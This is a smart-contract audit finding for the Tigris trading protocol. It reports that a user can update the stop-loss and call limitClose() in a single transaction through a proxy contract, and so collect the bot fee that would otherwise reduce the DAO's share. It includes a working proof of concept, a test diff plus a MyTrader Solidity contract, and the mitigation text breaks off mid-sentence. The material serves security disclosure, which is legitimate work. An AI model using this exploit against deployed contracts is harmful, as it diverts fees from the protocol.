## Tags

- bug
- 2 (Med Risk)
- judge review requested
- selected for report
- sponsor confirmed
- M-17

# [User can close an order via `limitClose()`, and take bot fees to themselves](https://github.com/code-423n4/2022-12-tigris-findings/issues/468) 

# Lines of code

https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L565-L576


# Vulnerability details



## Impact
Bot fees are used when a position is opened/closed via a bot. In that case a bot fee is subtracted from the dao fee and sent to the closing bot.
A user can use that to to reduce the dao fees for closing an order and keep it to themselves.
Instead of closing the order via `initiateClose()`, the user can use a proxy contract to update the stop-loss value and then `limitClose()` the order.
Since that is done in one function call, no bot can run the `limitClose()` and the bot fee will go to the user.

## Proof of Concept

The following PoC shows how a trade is closed by a proxy contract that sets the limit and closes it via `limitClose()`:

```diff
diff --git a/test/07.Trading.js b/test/07.Trading.js
index ebe9948..e50b0cc 100644
--- a/test/07.Trading.js
+++ b/test/07.Trading.js
@@ -17,6 +17,7 @@ describe("Trading", function () {
 
   let TradingExtension;
   let tradingExtension;
+  let myTrader;
 
   let TradingLibrary;
   let tradinglibrary;
@@ -37,7 +38,7 @@ describe("Trading", function () {
 
   let MockDAI;
   let MockUSDC;
-  let mockusdc;
+  let mockusdc, mockdai;
 
   let badstablevault;
 
@@ -55,6 +56,7 @@ describe("Trading", function () {
     const Position = await deployments.get("Position");
     position = await ethers.getContractAt("Position", Position.address);
     MockDAI = await deployments.get("MockDAI");
+    mockdai = await ethers.getContractAt("MockERC20", MockDAI.address);
     MockUSDC = await deployments.get("MockUSDC");
     mockusdc = await ethers.getContractAt("MockERC20", MockUSDC.address);
     const PairsContract = await deployments.get("PairsContract");
@@ -84,6 +86,10 @@ describe("Trading", function () {
     TradingLibrary = await deployments.get("TradingLibrary");
     tradinglibrary = await ethers.getContractAt("TradingLibrary", TradingLibrary.address);
     await trading.connect(owner).setLimitOrderPriceRange(1e10);
+
+
+    let mtFactory = await ethers.getContractFactory("MyTrader");
+    myTrader = await mtFactory.deploy(Trading.address, Position.address);
   });
   describe("Check onlyOwner and onlyProtocol", function () {
     it("Set max win percent", async function () {
@@ -536,6 +542,31 @@ describe("Trading", function () {
       expect(await position.assetOpenPositionsLength(0)).to.equal(1); // Trade has opened
       expect(await stabletoken.balanceOf(owner.address)).to.equal(parseEther("0")); // Should no tigAsset left
     });
+
+    it("Test my trader", async function () {
+      let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 0, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];
+      let PriceData = [node.address, 0, parseEther("20000"), 0, 2000000000, false];
+      let message = ethers.utils.keccak256(
+        ethers.utils.defaultAbiCoder.encode(
+          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
+          [node.address, 0, parseEther("20000"), 0, 2000000000, false]
+        )
+      );
+      let sig = await node.signMessage(
+        Buffer.from(message.substring(2), 'hex')
+      );
+      
+      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];
+      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);
+
+
+      await trading.connect(owner).approveProxy(myTrader.address, 1e10);
+      await myTrader.connect(owner).closeTrade(1, PriceData, sig);
+
+
+    });
+  return;
+
     it("Closing over 100% should revert", async function () {
       let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 0, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];
       let PriceData = [node.address, 0, parseEther("20000"), 0, 2000000000, false];
@@ -551,8 +582,10 @@ describe("Trading", function () {
       
       let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];
       await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);
+
       await expect(trading.connect(owner).initiateCloseOrder(1, 1e10+1, PriceData, sig, StableVault.address, StableToken.address, owner.address)).to.be.revertedWith("BadClosePercent");
     });
+    return;
     it("Closing 0% should revert", async function () {
       let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 0, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];
       let PriceData = [node.address, 0, parseEther("20000"), 0, 2000000000, false];
@@ -700,6 +733,7 @@ describe("Trading", function () {
       expect(margin).to.equal(parseEther("500"));
     });
   });
+  return;
   describe("Trading using <18 decimal token", async function () {
     it("Opening and closing a position with tigUSD output", async function () {
       await pairscontract.connect(owner).setAssetBaseFundingRate(0, 0); // Funding rate messes with results because of time

```

`MyTrader.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ITrading} from "../interfaces/ITrading.sol";
import "../utils/TradingLibrary.sol";
import "../interfaces/IPosition.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/extensions/draft-ERC20Permit.sol";




contract MyTrader{

    ITrading trading;
    IPosition position;

    receive() payable external{

    }

    constructor(address _trading, address _position){
        trading = ITrading(_trading);
        position = IPosition(_position);
    }

    function closeTrade(
        uint _id,
        PriceData calldata _priceData,
        bytes calldata _signature
    ) public{
        bool _tp = false;
        
        trading.updateTpSl(_tp, _id, _priceData.price, _priceData, _signature, msg.sender);
        trading.limitClose(_id, _tp, _priceData, _signature);

        
    }

}
```

## Recommended Mitigation Steps
Don't allow updating sl or tp and 